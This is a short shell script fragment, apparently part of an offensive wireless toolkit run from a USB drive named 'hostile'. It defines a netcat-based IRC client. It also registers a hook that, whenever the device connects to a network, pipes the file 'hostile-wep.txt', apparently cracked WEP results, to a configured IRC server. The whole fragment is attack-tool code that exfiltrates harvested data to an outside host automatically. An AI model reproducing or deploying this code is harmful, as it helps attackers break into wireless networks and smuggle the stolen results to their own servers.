
h_irc_send() {
	echo -e "USER $4 HOSTNAME $1 :$4\nNICK $4\nJOIN $3"
	(echo USER "$4" HOSTNAME "$1" :"$4"
	echo NICK "$4"
	if [ "$( echo $3 | grep ^\# )" ]; then 
		echo JOIN "$3";
	fi
	while true; do
        	if [ -r "$5" ]; then 
        		tail -f $5 | \
			while read line ; do 
				echo "PRIVMSG $3 :$line";
			done;
		else
			read -r msg;
		fi
		if [ "$msg" ]; then
			echo "PRIVMSG $3 :$msg";
		else
			sleep 1 && echo QUIT;
		fi
	done) | nc "$1" "$2"> /dev/null
}

h_irc_send_report() {
	h_log 0 "sending the report"
	rand=$(dd if=/dev/urandom bs=64 count=1 2>/dev/null |md5sum |cut -b 1-8)
	irc_user_local="$H_IRC_USER_LOCAL_PREFIX$rand"
	cat /mnt/usbdrive/hostile/hostile-run.d/hostile-wep.txt | h_irc_send $H_IRC_SERVER 6667 $H_IRC_USER_REMOTE $irc_user_local
	h_log 0 "report sent to server"
}

if [ "$H_IRC_REPORT" = "1" ]; then
	#h_irc_send_report
	h_hook_register_handler on_sta_connected h_irc_send_report
	
fi

